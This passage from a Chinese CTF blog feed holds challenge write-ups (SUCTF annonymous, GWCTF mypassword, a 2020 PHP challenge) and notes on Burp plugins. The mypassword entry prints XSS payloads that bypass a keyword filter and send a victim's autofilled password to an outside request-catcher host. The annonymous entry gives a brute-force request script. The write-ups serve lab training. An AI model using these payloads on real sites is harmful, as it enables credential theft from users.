punctuation">;</span>    <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token function">show_source</span><span class="token punctuation">(</span><span class="token constant">__FILE__</span><span class="token punctuation">)</span><span class="token punctuation">;</span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h2 id="é¢˜è§£"><a href="#é¢˜è§£" class="headerlink" title="é¢˜è§£"></a>é¢˜è§£</h2><p><code>create_function()</code>ç”¨æ³•è§<a href="https://syunaht.com/p/3645611024.html#toc-heading-10">åˆ·é¢˜ç¬”è®°:[BJDCTF2020]EzPHP</a></p><pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span><span class="token variable">$lambda</span> <span class="token operator">=</span> <span class="token function">create_function</span><span class="token punctuation">(</span><span class="token string single-quoted-string">''</span><span class="token punctuation">,</span> <span class="token string single-quoted-string">'return 1;'</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token function">print_r</span><span class="token punctuation">(</span><span class="token variable">$lambda</span><span class="token punctuation">)</span><span class="token punctuation">;</span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre><p>æ³¨æ„æ²¡åŠ æ‹¬å·ï¼Œä¼šæ‰“å°<code>%00lambda_%d</code>è¿™æ ·å½¢å¼çš„å­—ç¬¦ä¸²ï¼Œä¹Ÿå°±æ˜¯åŒ¿åå‡½æ•°çš„å‡½æ•°åï¼Œä¼šéšç€åˆ·æ–°ä¸æ–­å¢å¤§ã€‚</p><p><img src="/../images/%E5%88%B7%E9%A2%98%E7%AC%94%E8%AE%B0-SUCTF-2018-annonymous/image-20210825191722768.png"></p><blockquote><p><code>%d</code>æ˜¯æŒç»­é€’å¢çš„ï¼Œè¿™é‡Œçš„<code>%d</code>ä¼šä¸€ç›´é€’å¢åˆ°æœ€å¤§é•¿åº¦ç›´åˆ°ç»“æŸï¼Œé€šè¿‡å¤§é‡çš„è¯·æ±‚æ¥è¿«ä½¿<code>Pre-fork</code>æ¨¡å¼å¯åŠ¨Apacheå¯åŠ¨æ–°çš„çº¿ç¨‹ï¼Œè¿™æ ·è¿™é‡Œçš„<code>%d</code>ä¼šåˆ·æ–°ä¸º1</p></blockquote><pre class="line-numbers language-none"><code class="language-none">import requestsi &#x3D; 0while True:    r &#x3D; requests.get(&#39;http:&#x2F;&#x2F;471d0bad-6115-4107-a4ab-33cd2cb83b26.node4.buuoj.cn:81&#x2F;?func_name&#x3D;%00lambda_1&#39;)    if &#39;flag&#39; in r.text:        print(r.text)        break    i +&#x3D; 1    print(i)<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>]]></content>
      
      
      <categories>
          
          <category> Web </category>
          
      </categories>
      
      
        <tags>
            
            <tag> CTF </tag>
            
            <tag> Web </tag>
            
            <tag> PHPä»£ç å®¡è®¡ </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>åˆ·é¢˜ç¬”è®°:[GWCTF 2019]mypassword</title>
      <link href="/p/2970831002.html"/>
      <url>/p/2970831002.html</url>
      
        <content type="html"><![CDATA[<h2 id="å‰è¨€"><a href="#å‰è¨€" class="headerlink" title="å‰è¨€"></a>å‰è¨€</h2><p><img src="/../images/%E5%88%B7%E9%A2%98%E7%AC%94%E8%AE%B0-GWCTF-2019-mypassword/image-20210824204245050.png"></p><h2 id="é¢˜è§£"><a href="#é¢˜è§£" class="headerlink" title="é¢˜è§£"></a>é¢˜è§£</h2><p>login.js</p><pre class="line-numbers language-javascript" data-language="javascript"><code class="language-javascript"><span class="token keyword">if</span> <span class="token punctuation">(</span>document<span class="token punctuation">.</span>cookie <span class="token operator">&amp;&amp;</span> document<span class="token punctuation">.</span>cookie <span class="token operator">!=</span> <span class="token string">''</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span><span class="token keyword">var</span> cookies <span class="token operator">=</span> document<span class="token punctuation">.</span>cookie<span class="token punctuation">.</span><span class="token function">split</span><span class="token punctuation">(</span><span class="token string">'; '</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">var</span> cookie <span class="token operator">=</span> <span class="token punctuation">&#123;</span><span class="token punctuation">&#125;</span><span class="token punctuation">;</span><span class="token keyword">for</span> <span class="token punctuation">(</span><span class="token keyword">var</span> i <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span> i <span class="token operator">&lt;</span> cookies<span class="token punctuation">.</span>length<span class="token punctuation">;</span> i<span class="token operator">++</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span><span class="token keyword">var</span> arr <span class="token operator">=</span> cookies<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">.</span><span class="token function">split</span><span class="token punctuation">(</span><span class="token string">'='</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">var</span> key <span class="token operator">=</span> arr<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">;</span>cookie<span class="token punctuation">[</span>key<span class="token punctuation">]</span> <span class="token operator">=</span> arr<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token keyword">if</span><span class="token punctuation">(</span><span class="token keyword">typeof</span><span class="token punctuation">(</span>cookie<span class="token punctuation">[</span><span class="token string">'user'</span><span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token operator">!=</span> <span class="token string">"undefined"</span> <span class="token operator">&amp;&amp;</span> <span class="token keyword">typeof</span><span class="token punctuation">(</span>cookie<span class="token punctuation">[</span><span class="token string">'psw'</span><span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token operator">!=</span> <span class="token string">"undefined"</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>document<span class="token punctuation">.</span><span class="token function">getElementsByName</span><span class="token punctuation">(</span><span class="token string">"username"</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">.</span>value <span class="token operator">=</span> cookie<span class="token punctuation">[</span><span class="token string">'user'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>document<span class="token punctuation">.</span><span class="token function">getElementsByName</span><span class="token punctuation">(</span><span class="token string">"password"</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">.</span>value <span class="token operator">=</span> cookie<span class="token punctuation">[</span><span class="token string">'psw'</span><span class="token punctuation">]</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p><img src="/../images/%E5%88%B7%E9%A2%98%E7%AC%94%E8%AE%B0-GWCTF-2019-mypassword/image-20210824211547043.png"></p><p><img src="/../images/%E5%88%B7%E9%A2%98%E7%AC%94%E8%AE%B0-GWCTF-2019-mypassword/image-20210824213535253.png"></p><p>æœ‰æ›¿æ¢ï¼Œä½†æ³¨æ„ï¼Œè¿™é‡Œç”¨çš„æ˜¯éé€’å½’æ€æƒ³ï¼Œä¹Ÿå°±æ˜¯è¯´æ˜¯é»‘åå•é‡Œçš„å•ä¸ªå…ƒç´ è¿›è¡Œå¾ªç¯æ›¿æ¢ï¼Œç„¶åå†è¿›è¡Œä¸‹ä¸€ä¸ªã€‚è¿™ç§æƒ…å†µå°±å¯ä»¥åŒå†™ç»•è¿‡ã€‚</p><pre class="line-numbers language-JavaScript" data-language="JavaScript"><code class="language-JavaScript">&lt;scriphostt&gt;alert(1)&lt;&#x2F;scriphostt&gt;<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="/../images/%E5%88%B7%E9%A2%98%E7%AC%94%E8%AE%B0-GWCTF-2019-mypassword/image-20210824220745862.png"></p><p>æ„Ÿè§‰å°±åº”è¯¥æ˜¯xssé¢˜ç›®äº†ã€‚</p><p>åŠ ä¸Šlogin.jsé‡Œçš„å†…å®¹ï¼Œå¤§è‡´å°±æ˜¯è¯»å–cookiesã€‚</p><p>æŠ„æŠ„wpï¼Œåˆ©ç”¨<a href="http://http.requestbin.buuoj.cn/%E8%8E%B7%E5%8F%96%E4%B8%8B%E8%AF%B7%E6%B1%82">http://http.requestbin.buuoj.cn/è·å–ä¸‹è¯·æ±‚</a></p><pre class="line-numbers language-JavaScript" data-language="JavaScript"><code class="language-JavaScript">&lt;input type&#x3D;&quot;text&quot; name&#x3D;&quot;username&quot;&gt;&lt;input type&#x3D;&quot;password&quot; name&#x3D;&quot;password&quot;&gt;&lt;script src&#x3D;&quot;.&#x2F;js&#x2F;login.js&quot;&gt;&lt;&#x2F;script&gt;&lt;script&gt;var psw &#x3D; document.getElementsByName(&quot;password&quot;)[0].value;document.location&#x3D;&quot;http:&#x2F;&#x2F;http.requestbin.buuoj.cn&#x2F;1ihbkir1&#x2F;?psw&#x3D;&quot;+psw;&lt;&#x2F;script&gt;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>åŠ ä¸ªcookieç»•è¿‡æ›¿æ¢</p><pre class="line-numbers language-JavaScript" data-language="JavaScript"><code class="language-JavaScript">&lt;incookieput type&#x3D;&quot;text&quot; name&#x3D;&quot;username&quot;&gt;&lt;incookieput type&#x3D;&quot;password&quot; name&#x3D;&quot;password&quot;&gt;&lt;scrcookieipt scookierc&#x3D;&quot;.&#x2F;js&#x2F;login.js&quot;&gt;&lt;&#x2F;scrcookieipt&gt;&lt;scrcookieipt&gt;var psw &#x3D; docucookiement.getcookieElementsByName(&quot;password&quot;)[0].value;docucookiement.locacookietion&#x3D;&quot;http:&#x2F;&#x2F;http.requestbin.buuoj.cn&#x2F;1ihbkir1&#x2F;?psw&#x3D;&quot;+psw;&lt;&#x2F;scrcookieipt&gt;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>ç­‰äº†å¾ˆä¹…ï¼Œè¿˜æ˜¯æ²¡è§¦å‘æˆ‘çš„xssï¼Œæ— è¯­äº†ã€‚</p><p>2021å¹´9æœˆ12æ—¥12:28:43</p><p>é¶æœºå¯è¿å¤–ç½‘ï¼Œç›´æ¥ç”¨<a href="https://beeceptor.com/">beeceptor</a>å§</p><pre class="line-numbers language-JavaScript" data-language="JavaScript"><code class="language-JavaScript">&lt;incookieput type&#x3D;&quot;text&quot; name&#x3D;&quot;username&quot;&gt;&lt;incookieput type&#x3D;&quot;password&quot; name&#x3D;&quot;password&quot;&gt;&lt;scrcookieipt scookierc&#x3D;&quot;.&#x2F;js&#x2F;login.js&quot;&gt;&lt;&#x2F;scrcookieipt&gt;&lt;scrcookieipt&gt;var psw &#x3D; docucookiement.getcookieElementsByName(&quot;password&quot;)[0].value;docucookiement.locacookietion&#x3D;&quot;https:&#x2F;&#x2F;ad456g45asd.free.beeceptor.com&#x2F;?psw&#x3D;&quot;+psw;&lt;&#x2F;scrcookieipt&gt;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p><img src="/../images/%E5%88%B7%E9%A2%98%E7%AC%94%E8%AE%B0-GWCTF-2019-mypassword/image-20210912123143238.png"></p>]]></content>
      
      
      <categories>
          
          <category> Web </category>
          
      </categories>
      
      
        <tags>
            
            <tag> CTF </tag>
            
            <tag> Web </tag>
            
            <tag> XSS </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Burpæ’ä»¶-Unicode Auto Decode</title>
      <link href="/p/1323803757.html"/>
      <url>/p/1323803757.html</url>
      
        <content type="html"><![CDATA[<h2 id="å‰è¨€"><a href="#å‰è¨€" class="headerlink" title="å‰è¨€"></a>å‰è¨€</h2><p><a href="http://xdxd.love/2015/04/20/burpsuite%E6%8F%92%E4%BB%B6%E5%BC%80%E5%8F%91%E4%B9%8Bpython%E7%AF%87/">åŸè´´é“¾æ¥</a>ï¼Œåœ¨æ­¤æ„Ÿè°¢è¿™ä½å¸ˆå‚…æå…¶è¯¦ç»†çš„æ³¨é‡Šã€‚</p><p>è¿™æ’ä»¶æŒºå¥½ä½¿ï¼Œé‡åˆ°unicodeç¼–ç çœçš„è½¬æ¥è½¬å»ï¼Œæ–¹ä¾¿çœ‹ç»“æœã€‚ä½†æœ‰ä¸ªé—®é¢˜å°±æ˜¯å®ƒåªä¼šè½¬ç¬¬ä¸€ä¸ªunicodeå­—ç¬¦ä¸²ï¼Œåé¢çš„å°±ä¸è½¬äº†ï¼Œäºæ˜¯æ‹¿æ¥æ”¹äº†æ”¹ã€‚</p><h2 id="æºç "><a href="#æºç " class="headerlink" title="æºç "></a>æºç </h2><p><a href="https://github.com/KagamigawaMeguri/burp-UnicodeAutoDecode">https://github.com/KagamigawaMeguri/burp-UnicodeAutoDecode</a></p><h2 id="æ•ˆæœ"><a href="#æ•ˆæœ" class="headerlink" title="æ•ˆæœ"></a>æ•ˆæœ</h2><p><img src="/../images/Burp%E6%8F%92%E4%BB%B6-Unicode-Auto-Decode/image-20210824001051562.png"></p><p><img src="/../images/Burp%E6%8F%92%E4%BB%B6-Unicode-Auto-Decode/image-20210824001101974.png"></p>]]></content>
      
      
      <categories>
          
          <category> Tools </category>
          
      </categories>
      
      
        <tags>
            
            <tag> CTF </tag>
            
            <tag> Web </tag>
            
            <tag> BurpSuite </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Burpæ’ä»¶-Copy as requests</title>
      <link href="/p/3960013565.html"/>
      <url>/p/3960013565.html</url>
      
        <content type="html"><![CDATA[<h2 id="å‰è¨€"><a href="#å‰è¨€" class="headerlink" title="å‰è¨€"></a>å‰è¨€</h2><p>è¿™æ’ä»¶æ˜¯ä»Šå¹´äº”æœˆä»½æ‰é‡åˆ°çš„ï¼Œç»“æœæ˜¯è¿™å‡ ä¸ªæœˆä»¥æ¥ä½¿ç”¨æœ€é¢‘ç¹çš„æ’ä»¶ï¼Œå¾ˆé€‚åˆæˆ‘ï¼Œæœ‰äº†å®ƒå°±ä¸éœ€è¦burpæŠ“åŒ…ï¼Œä¸€ä¸ªä¸€ä¸ªå¤åˆ¶æ•°æ®æˆ–è€…ç”¨æ‰”åˆ°POSTMANé‡Œç”Ÿæˆpythonä»£ç ã€‚å¯ä»¥ä¸€é”®ç”Ÿæˆï¼Œçˆ½å—·ï¼</p><p>ä½†å…¶ä¸­ä¹Ÿæœ‰äº›ä¸å¤ªæ»¡æ„çš„åœ°æ–¹ï¼Œäºæ˜¯ä»Šå¤©ç¢ç£¨äº†ä¸€ä¸‹ï¼Œæ”¹äº†æ”¹ï¼ŒæŠŠå®ƒå˜æˆæˆ‘æƒ³è¦çš„å½¢çŠ¶ã€‚</p><h2 id="æºç "><a href="#æºç " class="headerlink" title="æºç "></a>æºç </h2><p>æºç å’ŒjaråŒ…éƒ½æ”¾githubäº†ã€‚</p><p>åŸä½œè€…æ˜¯<a href="https://github.com/silentsignal">@silentsignal</a></p><p><a href="https://github.com/KagamigawaMeguri/burp-requests">https://github.com/KagamigawaMeguri/burp-requests</a></p><h2 id="ä¿®æ”¹"><a href="#ä¿®æ”¹" class="headerlink" title="ä¿®æ”¹"></a>ä¿®æ”¹</h2><ol><li><p>æŠŠmjsonä»1.4æ›´æ–°åˆ°äº†2.0</p></li><li><p>å› ä¸ºä¹‹å‰åšé¢˜æ­£å¥½æµ‹è¯•äº†ä¸‹requestsæ¨¡å—sessionå¯¹äºcookiesçš„ç®¡ç†é—®é¢˜ï¼Œ<a href="https://syunaht.com/p/2768731149.html#toc-heading-3">é“¾æ¥åœ¨è¿™</a>ã€‚äºæ˜¯æ”¹æˆåœ¨sessionè¿æ¥ä½¿ç”¨<code>cookies.update()</code></p></li><li><p>å¤åˆ¶ä¸€ä¸ªè¿æ¥çš„è¯å»æ‰äº†burp*_çš„å‰ç¼€ï¼Œå¤åˆ¶å¤šä¸ªåˆ™ä¿ç•™ã€‚å…¶ä¸­æœ‰ä¸ªé—®é¢˜å°±æ˜¯å¤åˆ¶å¤šä¸ªä¸åŒurlä¸ä¼šé‡æ–°åˆ›å»ºsessionï¼Œä½†ä¸æ‰“ç®—æ”¹ï¼Œå› ä¸ºå°±ä¸åº”è¯¥ä¸€æ¬¡æ€§é€‰æ‹©å¤šä¸ªä¸åŒåŸŸåç„¶åå¤åˆ¶ï¼Œè¿™æ²¡æœ‰æ„ä¹‰ã€‚</p></li><li><p>æºç ä½¿ç”¨gradleé‡æ„(æ²¡ç”¨è¿‡ant)ã€‚</p></li></ol>]]></content>
      
      
      <categories>
          
          <category> Tools </category>
          
      </categories>
      
      
        <tags>
            
            <tag> CTF </tag>
            
            <tag> Web </tag>
            
            <tag> BurpSuite </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Burpæ’ä»¶å¼€å‘ç¬”è®°</title>
      <link href="/p/1947914890.html"/>
      <url>/p/1947914890.html</url>
      
        <content type="html"><![CDATA[<h2 id="å‰è¨€"><a href="#å‰è¨€" class="headerlink" title="å‰è¨€"></a>å‰è¨€</h2><p>æƒ³æŠŠä¸€äº›å¥½ç”¨çš„æ’ä»¶æ”¹æˆè‡ªå·±æƒ³è¦çš„å½¢çŠ¶ï¼Œäºæ˜¯å°è¯•ä¸€ä¸‹ï¼Œå½“åšæ‹“å±•å­¦ä¹ äº†ã€‚</p><h2 id="JARæ‰“åŒ…"><a href="#JARæ‰“åŒ…" class="headerlink" title="JARæ‰“åŒ…"></a>JARæ‰“åŒ…</h2><p>å¥‡æ€ªçš„æ˜¯ï¼Œç…§ç€ç½‘ä¸Šæ•™ç¨‹åœ¨<em>Project Structure</em>é‡Œçš„<em>Artifacts</em>å¤„å°è¯•æ‰“åŒ…jarï¼Œä½†OKæ€ä¹ˆéƒ½ç‚¹ä¸ä¸‹å»ï¼Œæ˜æ˜ä»£ç æ˜¯ä¸€æ ·çš„ï¼Œéš¾é“æ˜¯ç”¨äº†gradleçš„å…³ç³»ï¼Ÿ</p><p>è¿˜æœ‰è¿™é‡Œæœ‰ä¸€ç¯‡æ–‡ç« æ•‘äº†æˆ‘</p><p><a href="https://www.secpulse.com/archives/124593.html">ä»å¤´å¼€å‘ä¸€ä¸ªBurpSuiteæ•°æ®æ”¶é›†æ’ä»¶</a></p><p>åœ¨<strong>build.gradle</strong>å¤„æ·»åŠ gradleæ’ä»¶<a href="https://plugins.gradle.org/plugin/com.github.johnrengelman.shadow">com.github.johnrengelman.shadow</a></p><pre class="line-numbers language-none"><code class="language-none">plugins &#123;    id &quot;com.github.johnrengelman.shadow&quot; version &quot;7.0.0&quot;&#125;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><p>ç„¶ååœ¨å³ä¾§gradleæ é€‰<code>shadowJar</code>å³å¯åœ¨<strong>build/libs</strong>ç›®å½•ä¸‹ç”ŸæˆjaråŒ…</p><p><img src="/../images/Burp%E6%8F%92%E4%BB%B6%E5%BC%80%E5%8F%91%E7%AC%94%E8%AE%B0/image-20210823164635997.png"></p>]]></content>
      
      
      <categories>
          
          <category> æ‚è°ˆ </category>
          
      </categories>
      
      
        <tags>
            
            <tag> CTF </tag>
            
            <tag> Web </tag>
            
            <tag> BurpSuite </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>åˆ·é¢˜ç¬”è®°:[2020 æ–°æ˜¥çº¢åŒ…é¢˜]1</title>
      <link href="/p/3729230019.html"/>
      <url>/p/3729230019.html</url>
      
        <content type="html"><![CDATA[<h2 id="å‰è¨€"><a href="#å‰è¨€" class="headerlink" title="å‰è¨€"></a>å‰è¨€</h2><p>hint1: /?src=1</p><pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span><span class="token function">error_reporting</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">class</span> <span class="token class-name-definition class-name">A</span> <span class="token punctuation">&#123;</span>    <span class="token keyword">protected</span> <span class="token variable">$store</span><span class="token punctuation">;</span>    <span class="token keyword">protected</span> <span class="token variable">$key</span><span class="token punctuation">;</span>    <span class="token keyword">protected</span> <span class="token variable">$expire</span><span class="token punctuation">;</span>    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function-definition function">__construct</span><span class="token punctuation">(</span><span class="token variable">$store</span><span class="token punctuation">,</span> <span class="token variable">$key</span> <span class="token operator">=</span> <span class="token string single-quoted-string">'flysystem'</span><span class="token punctuation">,</span> <span class="token variable">$expire</span> <span class="token operator">=</span> <span class="token constant">null</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>        <span class="token variable">$this</span><span class="token operator">-></span><span class="token property">key</span> <span class="token operator">=</span> <span class="token variable">$key</span><span class="token punctuation">;</span>        <span class="token variable">$this</span><span class="token operator">-></span><span class="token property">store</span> <span class="token operator">=</span> <span class="token variable">$store</span><span class="token punctuation">;</span>        <span class="token variable">$this</span><span class="token operator">-></span><span class="token property">expire</span> <span class="token operator">=</span> <span class="token variable">$expire</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function-definition function">cleanContents</span><span class="token punctuation">(</span><span class="token keyword type-hint">array</span> <span class="token variable">$contents</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>        <span class="token variable">$cachedProperties</span> <span class="token operator">=</span> <span class="token function">array_flip</span><span class="token punctuation">(</span><span class="token punctuation">[</span>            <span class="token string single-quoted-string">'path'</span><span class="token punctuation">,</span> <span class="token string single-quoted-string">'dirname'</span><span class="token punctuation">,</span> <span class="token string single-quoted-string">'basename'</span><span class="token punctuation">,</span> <span class="token string single-quoted-string">'extension'</span><span class="token punctuation">,</span> <span class="token string single-quoted-string">'filename'</span><span class="token punctuation">,</span>            <span class="token string single-quoted-string">'size'</span><span class="token punctuation">,</span> <span class="token string single-quoted-string">'mimetype'</span><span class="token punctuation">,</span> <span class="token string single-quoted-string">'visibility'</span><span class="token punctuation">,</span> <span class="token string single-quoted-string">'timestamp'</span><span class="token punctuation">,</span> <span class="token string single-quoted-string">'type'</span><span class="token punctuation">,</span>        <span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">foreach</span> <span class="token punctuation">(</span><span class="token variable">$contents</span> <span class="token keyword">as</span> <span class="token variable">$path</span> <span class="token operator">=></span> <span class="token variable">$object</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>            <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">is_array</span><span class="token punctuation">(</span><span class="token variable">$object</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>                <span class="token variable">$contents</span><span class="token punctuation">[</span><span class="token variable">$path</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token function">array_intersect_key</span><span class="token punctuation">(</span><span class="token variable">$object</span><span class="token punctuation">,</span> <span class="token variable">$cachedProperties</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token punctuation">&#125;</span>        <span class="token punctuation">&#125;</span>        <span class="token keyword">return</span> <span class="token variable">$contents</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function-definition function">getForStorage</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>        <span class="token variable">$cleaned</span> <span class="token operator">=</span> <span class="token variable">$this</span><span class="token operator">-></span><span class="token function">cleanContents</span><span class="token punctuation">(</span><span class="token variable">$this</span><span class="token operator">-></span><span class="token property">cache</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">return</span> <span class="token function">json_encode</span><span class="token punctuation">(</span><span class="token punctuation">[</span><span class="token variable">$cleaned</span><span class="token punctuation">,</span> <span class="token variable">$this</span><span class="token operator">-></span><span class="token property">complete</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function-definition function">save</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>        <span class="token variable">$contents</span> <span class="token operator">=</span> <span class="token variable">$this</span><span class="token operator">-></span><span class="token function">getForStorage</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token variable">$this</span><span class="token operator">-></span><span class="token property">store</span><span class="token operator">-></span><span class="token function">set</span><span class="token punctuation">(</span><span class="token variable">$this</span><span class="token operator">-></span><span class="token property">key</span><span class="token punctuation">,</span> <span class="token variable">$contents</span><span class="token punctuation">,</span> <span class="token variable">$this</span><span class="token operator">-></span><span class="token property">expire</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function-definition function">__destruct</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>        <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token operator">!</span><span class="token variable">$this</span><span class="token operator">-></span><span class="token property">autosave</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>            <span class="token variable">$this</span><span class="token operator">-></span><span class="token function">save</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">&#125;</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span class="token keyword">class</span> <span class="token class-name-definition class-name">B</span> <span class="token punctuation">&#123;</span>    <span class="token keyword">protected</span> <span class="token keyword">function</span> <span class="token function-definition function">getExpireTime</span><span class="token punctuation">(</span><span class="token variable">$expire</span><span class="token punctuation">)</span><span class="token punctuation">:</span> <span class="token keyword return-type">int</span> <span class="token punctuation">&#123;</span>        <span class="token keyword">return</span> <span class="token punctuation">(</span><span class="token keyword type-casting">int</span><span class="token punctuation">)</span> <span class="token variable">$expire</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function-definition function">getCacheKey</span><span class="token punctuation">(</span><span class="token keyword type-hint">string</span> <span class="token variable">$name</span><span class="token punctuation">)</span><span class="token punctuation">:</span> <span class="token keyword return-type">string</span> <span class="token punctuation">&#123;</span>        <span class="token comment">// ä½¿ç¼“å­˜æ–‡ä»¶åéšæœº</span>        <span class="token variable">$cache_filename</span> <span class="token operator">=</span> <span class="token variable">$this</span><span class="token operator">-></span><span class="token property">options</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'prefix'</span><span class="token punctuation">]</span> <span class="token operator">.</span> <span class="token function">uniqid</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">.</span> <span class="token variable">$name</span><span class="token punctuation">;</span>        <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token function">substr</span><span class="token punctuation">(</span><span class="token variable">$cache_filename</span><span class="token punctuation">,</span> <span class="token operator">-</span><span class="token function">strlen</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'.php'</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token operator">===</span> <span class="token string single-quoted-string">'.php'</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>          <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'?'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">&#125;</span>        <span class="token keyword">return</span> <span class="token variable">$cache_filename</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    <span class="token keyword">protected</span> <span class="token keyword">function</span> <span class="token function-definition function">serialize</span><span class="token punctuation">(</span><span class="token variable">$data</span><span class="token punctuation">)</span><span class="token punctuation">:</span> <span class="token keyword return-type">string</span> <span class="token punctuation">&#123;</span>        <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">is_numeric</span><span class="token punctuation">(</span><span class="token variable">$data</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>            <span class="token keyword">return</span> <span class="token punctuation">(</span><span class="token keyword type-casting">string</span><span class="token punctuation">)</span> <span class="token variable">$data</span><span class="token punctuation">;</span>        <span class="token punctuation">&#125;</span>        <span class="token variable">$serialize</span> <span class="token operator">=</span> <span class="token variable">$this</span><span class="token operator">-></span><span class="token property">options</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'serialize'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>        <span class="token keyword">return</span> <span class="token variable">$serialize</span><span class="token punctuation">(</span><span class="token variable">$data</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function-definition function">set</span><span class="token punctuation">(</span><span class="token variable">$name</span><span class="token punctuation">,</span> <span class="token variable">$value</span><span class="token punctuation">,</span> <span class="token variable">$expire</span> <span class="token operator">=</span> <span class="token constant">null</span><span class="token punctuation">)</span><span class="token punctuation">:</span> <span class="token keyword return-type">bool</span><span class="token punctuation">&#123;</span>        <span class="token variable">$this</span><span class="token operator">-></span><span class="token property">writeTimes</span><span class="token operator">++</span><span class="token punctuation">;</span>        <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">is_null</span><span class="token punctuation">(</span><span class="token variable">$expire</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token 